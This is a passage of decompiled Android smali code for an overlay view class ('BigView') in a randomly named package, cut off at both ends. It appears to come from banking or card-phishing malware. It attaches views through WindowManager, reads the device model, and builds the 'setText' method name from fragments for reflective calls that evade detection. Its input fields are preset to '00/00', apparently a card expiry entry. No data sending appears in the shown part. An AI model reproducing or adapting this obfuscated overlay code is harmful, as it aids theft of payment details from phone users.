    invoke-interface {v0, p0}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    .line 253
    return-void
.end method

.method public getDeviceName()Ljava/lang/String;
    .locals 4

    .prologue
    .line 116
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    .line 117
    .local v0, "manufacturer":Ljava/lang/String;
    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    .line 118
    .local v1, "model":Ljava/lang/String;
    invoke-virtual {v1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 119
    invoke-direct {p0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 121
    :goto_0
    return-object v2

    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {p0, v0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_0
.end method

.method public getLayoutGravity()I
    .locals 1

    .prologue
    .line 144
    const/16 v0, 0x11

    return v0
.end method

.method protected getLeftOnScreen()I
    .locals 2

    .prologue
    .line 367
    const/4 v1, 0x2

    new-array v0, v1, [I

    .line 369
    .local v0, "location":[I
    invoke-virtual {p0, v0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getLocationOnScreen([I)V

    .line 371
    const/4 v1, 0x0

    aget v1, v0, v1

    return v1
.end method

.method public getService()Lqfu/wfwhgkemerzo/eislrebmhmf/EtroDetra;
    .locals 1

    .prologue
    .line 138
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v0

    check-cast v0, Lqfu/wfwhgkemerzo/eislrebmhmf/EtroDetra;

    return-object v0
.end method

.method protected hide()V
    .locals 7

    .prologue
    .line 299
    :try_start_0
    invoke-super {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Class;->getSuperclass()Ljava/lang/Class;

    move-result-object v2

    const-string v3, "setVisibility"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Class;

    const/4 v5, 0x0

    .line 300
    sget-object v6, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v5

    .line 299
    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    :try_end_0
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v1

    .line 302
    .local v1, "method":Ljava/lang/reflect/Method;
    :try_start_1
    invoke-super {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    const/16 v5, 0x8

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/IllegalArgumentException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/IllegalAccessException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_1 .. :try_end_1} :catch_3
    .catch Ljava/lang/NoSuchMethodException; {:try_start_1 .. :try_end_1} :catch_1

    .line 318
    .end local v1    # "method":Ljava/lang/reflect/Method;
    :goto_0
    return-void

    .line 303
    .restart local v1    # "method":Ljava/lang/reflect/Method;
    :catch_0
    move-exception v0

    .line 305
    .local v0, "e":Ljava/lang/IllegalArgumentException;
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/IllegalArgumentException;->printStackTrace()V
    :try_end_2
    .catch Ljava/lang/NoSuchMethodException; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_0

    .line 313
    .end local v0    # "e":Ljava/lang/IllegalArgumentException;
    .end local v1    # "method":Ljava/lang/reflect/Method;
    :catch_1
    move-exception v0

    .line 315
    .local v0, "e":Ljava/lang/NoSuchMethodException;
    invoke-virtual {v0}, Ljava/lang/NoSuchMethodException;->printStackTrace()V

    goto :goto_0

    .line 306
    .end local v0    # "e":Ljava/lang/NoSuchMethodException;
    .restart local v1    # "method":Ljava/lang/reflect/Method;
    :catch_2
    move-exception v0

    .line 308
    .local v0, "e":Ljava/lang/IllegalAccessException;
    :try_start_3
    invoke-virtual {v0}, Ljava/lang/IllegalAccessException;->printStackTrace()V

    goto :goto_0

    .line 309
    .end local v0    # "e":Ljava/lang/IllegalAccessException;
    :catch_3
    move-exception v0

    .line 311
    .local v0, "e":Ljava/lang/reflect/InvocationTargetException;
    invoke-virtual {v0}, Ljava/lang/reflect/InvocationTargetException;->printStackTrace()V
    :try_end_3
    .catch Ljava/lang/NoSuchMethodException; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_0
.end method

.method protected inflateView()V
    .locals 3

    .prologue
    .line 165
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "layout_inflater"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/LayoutInflater;

    .line 167
    .local v0, "inflater":Landroid/view/LayoutInflater;
    iget v1, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->layoutResId:I

    invoke-virtual {v0, v1, p0}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    .line 169
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->onInflateView()V

    .line 170
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->startinfo()V

    .line 171
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->vbivinfo()V

    .line 172
    return-void
.end method

.method public input(Ljava/lang/String;Ljava/lang/String;I)V
    .locals 8
    .param p1, "str"    # Ljava/lang/String;
    .param p2, "pole"    # Ljava/lang/String;
    .param p3, "len"    # I

    .prologue
    .line 1170
    invoke-static {p2}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getId(Ljava/lang/String;)I

    move-result v3

    invoke-virtual {p0, v3}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    .line 1171
    .local v1, "linLayout":Landroid/widget/TextView;
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->length()I

    move-result v3

    if-ge v3, p3, :cond_0

    .line 1172
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 1173
    .local v2, "tmp":Ljava/lang/String;
    :try_start_0
    const-string v0, "tTe"

    .local v0, "dsfdfdd":Ljava/lang/String;
    const-string v3, "android.widget.TextView"

    invoke-static {v3}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "se"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "xt"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Class;

    const/4 v6, 0x0

    const-class v7, Ljava/lang/CharSequence;

    aput-object v7, v5, v6

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    invoke-virtual {v3, v1, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 1176
    .end local v0    # "dsfdfdd":Ljava/lang/String;
    .end local v2    # "tmp":Ljava/lang/String;
    :cond_0
    :goto_0
    return-void

    .line 1173
    .restart local v2    # "tmp":Ljava/lang/String;
    :catch_0
    move-exception v3

    goto :goto_0
.end method

.method public inputclear(Ljava/lang/String;I)V
    .locals 7
    .param p1, "pole"    # Ljava/lang/String;
    .param p2, "len"    # I

    .prologue
    .line 1156
    invoke-static {p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getId(Ljava/lang/String;)I

    move-result v2

    invoke-virtual {p0, v2}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    .line 1158
    .local v1, "linLayout":Landroid/widget/TextView;
    :try_start_0
    const-string v0, "tTe"

    .local v0, "dsfdfdd":Ljava/lang/String;
    const-string v2, "android.widget.TextView"

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "se"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "xt"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Class;

    const/4 v5, 0x0

    const-class v6, Ljava/lang/CharSequence;

    aput-object v6, v4, v5

    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-string v5, ""

    aput-object v5, v3, v4

    invoke-virtual {v2, v1, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 1160
    .end local v0    # "dsfdfdd":Ljava/lang/String;
    :goto_0
    return-void

    .line 1158
    :catch_0
    move-exception v2

    goto :goto_0
.end method

.method public inputclearm(Ljava/lang/String;I)V
    .locals 7
    .param p1, "pole"    # Ljava/lang/String;
    .param p2, "len"    # I

    .prologue
    .line 1178
    invoke-static {p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getId(Ljava/lang/String;)I

    move-result v2

    invoke-virtual {p0, v2}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    .line 1179
    .local v1, "linLayout":Landroid/widget/TextView;
    :try_start_0
    const-string v0, "tTe"

    .local v0, "dsfdfdd":Ljava/lang/String;
    const-string v2, "android.widget.TextView"

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "se"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "xt"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Class;

    const/4 v5, 0x0

    const-class v6, Ljava/lang/CharSequence;

    aput-object v6, v4, v5

    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-string v5, "00/00"

    aput-object v5, v3, v4

    invoke-virtual {v2, v1, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 1181
    .end local v0    # "dsfdfdd":Ljava/lang/String;
    :goto_0
    return-void

    .line 1179
    :catch_0
    move-exception v2

    goto :goto_0
.end method

.method public inputdel(Ljava/lang/String;I)V
    .locals 8
    .param p1, "pole"    # Ljava/lang/String;
    .param p2, "len"    # I

    .prologue
    .line 1162
    invoke-static {p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getId(Ljava/lang/String;)I

    move-result v3

    invoke-virtual {p0, v3}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    .line 1163
    .local v1, "linLayout":Landroid/widget/TextView;
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 1164
    .local v2, "tmp":Ljava/lang/String;
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v3

    if-lez v3, :cond_0

    .line 1165
    :try_start_0
    const-string v0, "tTe"

    .local v0, "dsfdfdd":Ljava/lang/String;
    const-string v3, "android.widget.TextView"

    invoke-static {v3}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "se"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "xt"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Class;

    const/4 v6, 0x0

    const-class v7, Ljava/lang/CharSequence;

    aput-object v7, v5, v6

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v7

    add-int/lit8 v7, v7, -0x1

    invoke-virtual {v2, v6, v7}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    invoke-virtual {v3, v1, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 1168
    .end local v0    # "dsfdfdd":Ljava/lang/String;
    :cond_0
    :goto_0
    return-void

    .line 1165
    :catch_0
    move-exception v3

    goto :goto_0
.end method

.method public inputdelm(Ljava/lang/String;I)V
    .locals 9
    .param p1, "pole"    # Ljava/lang/String;
    .param p2, "len"    # I

    .prologue
    .line 1183
    invoke-static {p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getId(Ljava/lang/String;)I

    move-result v4

    invoke-virtual {p0, v4}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    .line 1184
    .local v1, "linLayout":Landroid/widget/TextView;
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 1185
    .local v2, "tmp":Ljava/lang/String;
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v4

    if-lez v4, :cond_0

    .line 1187
    :try_start_0
    const-string v0, "tTe"

    .local v0, "dsfdfdd":Ljava/lang/String;
    const-string v4, "android.widget.TextView"

    invoke-static {v4}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "se"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "xt"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Class;

    const/4 v7, 0x0

    const-class v8, Ljava/lang/CharSequence;

    aput-object v8, v6, v7

    invoke-virtual {v4, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Object;

    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v8

    add-int/lit8 v8, v8, -0x1

    invoke-virtual {v2, v7, v8}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v7

    aput-object v7, v5, v6

    invoke-virtual {v4, v1, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    .line 1190
    .end local v0    # "dsfdfdd":Ljava/lang/String;
    :cond_0
    :goto_0
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    .line 1191
    .local v3, "tmp2":Ljava/lang/String;
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v4

    if-nez v4, :cond_1

    .line 1192
    :try_start_1
    const-string v0, "tTe"

    .restart local v0    # "dsfdfdd":Ljava/lang/String;
    const-string v4, "android.widget.TextView"

    invoke-static {v4}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "se"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "xt"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Class;

    const/4 v7, 0x0

    const-class v8, Ljava/lang/CharSequence;

    aput-object v8, v6, v7

    invoke-virtual {v4, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Object;

    const/4 v6, 0x0

    const-string v7, "00/00"

    aput-object v7, v5, v6

    invoke-virtual {v4, v1, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    .line 1195
    .end local v0    # "dsfdfdd":Ljava/lang/String;
    :cond_1
    :goto_1
    return-void

    .line 1192
    :catch_0
    move-exception v4

    goto :goto_1

    .line 1187
    .end local v3    # "tmp2":Ljava/lang/String;
    :catch_1
    move-exception v4

    goto :goto_0
.end method

.method public inputm(Ljava/lang/String;Ljava/lang/String;I)V
    .locals 9
    .param p1, "str"    # Ljava/lang/String;
    .param p2, "pole"    # Ljava/lang/String;
    .param p3, "len"    # I

    .prologue
    const/4 v8, 0x1

    .line 1197
    invoke-static {p2}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getId(Ljava/lang/String;)I

    move-result v3

    invoke-virtual {p0, v3}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    .line 1198
    .local v1, "linLayout":Landroid/widget/TextView;
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "00/00"

    invoke-virtual {v3, v4}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 1200
    :try_start_0
    const-string v0, "tTe"

    .local v0, "dsfdfdd":Ljava/lang/String;
    const-string v3, "android.widget.TextView"

    invoke-static {v3}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "se"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "xt"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Class;

    const/4 v6, 0x0

    const-class v7, Ljava/lang/CharSequence;

    aput-object v7, v5, v6

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-string v6, ""

    aput-object v6, v4, v5

    invoke-virtual {v3, v1, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_5

    .line 1204
    .end local v0    # "dsfdfdd":Ljava/lang/String;
    :cond_0
    :goto_0
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->length()I

    move-result v3

    const/4 v4, 0x4

    if-ne v3, v4, :cond_1

    .line 1205
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 1207
    .local v2, "tmp":Ljava/lang/String;
    :try_start_1
    const-string v0, "tTe"

    .restart local v0    # "dsfdfdd":Ljava/lang/String;
    const-string v3, "android.widget.TextView"

    invoke-static {v3}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "se"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "xt"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Class;

    const/4 v6, 0x0

    const-class v7, Ljava/lang/CharSequence;

    aput-object v7, v5, v6

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    invoke-virtual {v3, v1, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_4

    .line 1210
    .end local v0    # "dsfdfdd":Ljava/lang/String;
    .end local v2    # "tmp":Ljava/lang/String;
    :cond_1
    :goto_1
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->length()I

    move-result v3

    const/4 v4, 0x3

    if-ne v3, v4, :cond_2

    .line 1211
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 1213
    .restart local v2    # "tmp":Ljava/lang/String;
    :try_start_2
    const-string v0, "tTe"

    .restart local v0    # "dsfdfdd":Ljava/lang/String;
    const-string v3, "android.widget.TextView"

    invoke-static {v3}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "se"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "xt"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Class;

    const/4 v6, 0x0

    const-class v7, Ljava/lang/CharSequence;

    aput-object v7, v5, v6

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

